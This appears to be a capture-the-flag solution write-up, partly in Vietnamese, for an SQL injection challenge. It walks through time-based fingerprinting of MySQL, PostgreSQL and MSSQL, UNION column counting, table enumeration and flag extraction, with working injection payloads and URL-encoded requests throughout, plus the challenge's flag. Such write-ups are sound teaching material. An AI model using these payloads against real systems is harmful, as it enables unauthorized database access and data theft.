# SQLi-007 Solution: Time-based DBMS Fingerprinting

## Step 1: Test for SQL Injection

**Basic test:**

```
/api/user?id=1'
/api/user?id=1 OR 1=1--
```

Nếu không có error message hiển thị → cần dùng time-based detection

---

## Step 2: Time-based DBMS Fingerprinting

**Test MySQL:**

```sql
/api/user?id=1 AND SLEEP(5)--
```

❌ No delay → Not MySQL

**Test PostgreSQL:**

```sql
/api/user?id=1; SELECT pg_sleep(5)--
```

❌ No delay → Not PostgreSQL

**Test MSSQL:**

```sql
/api/user?id=1; WAITFOR DELAY '0:0:5'--
```

✅ **5 second delay = MSSQL confirmed!**

---

## Step 3: Determine Number of Columns

```sql
/api/user?id=1 UNION SELECT NULL--         (Error)
/api/user?id=1 UNION SELECT NULL,NULL--    (Error)
/api/user?id=1 UNION SELECT NULL,NULL,NULL--  (Error)
/api/user?id=1 UNION SELECT NULL,NULL,NULL,NULL--  (Success)
```

✅ **Result:** Query có 4 cột

---

## Step 4: Enumerate Tables

**List all tables:**

```sql
/api/user?id=1 UNION SELECT 1,(SELECT table_name+',' FROM information_schema.tables FOR XML PATH('')),3,4--
```

**Result:** Tìm thấy table `flags`

---

## Step 5: Extract Flag using FOR XML PATH

**Final payload:**

```sql
1 UNION SELECT 1,(SELECT value FROM flags FOR XML PATH('')),3,4--
```

**URL Encoded:**

```
GET /api/user?id=1%20UNION%20SELECT%201,(SELECT%20value%20FROM%20flags%20FOR%20XML%20PATH('')),3,4--%20 HTTP/1.1
```

**Alternative (với 'a' cho columns 3,4):**

```
GET /api/user?id=1%20UNION%20SELECT%201,(SELECT%20value%20FROM%20flags+FOR+XML+PATH('')),'a','a'%20--%20 HTTP/1.1
```

---

## Flag

```
FLAG{t1m3_b4s3d_mssql_f1ng3rpr1nt}
```

---

## Key Learnings

1. **MSSQL time-based detection:** `WAITFOR DELAY '0:0:5'`
2. **Stacked queries:** MSSQL support `;` để chain queries
3. **FOR XML PATH:** Aggregate multiple rows trong MSSQL
4. **Comment syntax:** `--` (cần space sau) hoặc `/* */`
5. Time-based fingerprinting hữu ích khi không có error messages
